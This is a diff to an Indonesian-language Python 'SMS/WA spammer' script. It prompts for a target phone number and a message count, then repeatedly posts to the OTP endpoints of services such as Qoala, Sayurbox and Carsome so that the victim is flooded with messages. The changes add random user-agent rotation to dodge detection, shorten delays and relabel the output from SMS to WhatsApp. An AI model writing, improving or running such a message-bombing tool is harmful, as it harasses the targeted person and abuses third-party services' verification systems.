@@ -1,7 +1,7 @@
 # mengetik
 
 #import
-import os,sys,time,json,requests
+import os,sys,time,json,requests,random
 from time import sleep
 
 # mengetik
@@ -89,6 +89,7 @@ time.sleep(2)
 print("")
 
 k = 0
+user = random.choice(["Mozilla/5.0 (Linux; Android 11; KB2001 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; CLT-L29 Build/HUAWEICLT-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/321.0.0.37.119;]"])
 nomer = input(f"{O} ∎--> Nomer Target : ")
 jumlah = int(input(f"{O} ∎--> Spam Yang Ngotak! : "))
 # headers
@@ -107,7 +108,7 @@ headers_qoala = {
 'Host': 'api.qoalaplus.com',
 'content-length': '17',                                                                                                              
 'accept': 'application/json, text/plain, */*',
-'user-agent': 'Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36',
+'user-agent': user,
 'content-type': 'application/json',
 'origin': 'https://www.qoalaplus.com',
 'sec-fetch-site': 'same-site',
@@ -172,11 +173,11 @@ for k in range(jumlah):
   if "200" in pos_qoala:
     time.sleep(3)
     print(f"{H}____________________________________________")
-    print(f"{P}--> SMS QOALA MASUK",k)
+    print(f"{P}--> WA QOALA MASUK",k)
   else:
     time.sleep(3)
     print(f"{H}____________________________________________")
-    print(f"{M}--> MAAF SMS QOALA GAGAL",k)
+    print(f"{M}--> MAAF WA QOALA GAGAL",k)
 for k in range(jumlah):
   k += 1
   pos_sayur = requests.post("https://www.sayurbox.com/graphql/v1?deduplicate=1",headers=headers_sayur,data=data_sayur).text
@@ -199,7 +200,7 @@ for k in range(jumlah):
     time.sleep(3)
     print(f"{H}____________________________________________")
     print(f"{M}--> SPAM WA CARSOME GAGAL",k)
-    time.sleep(7)
+    time.sleep(5)
 os.system("clear")
 os.system("python SWS.py")
 
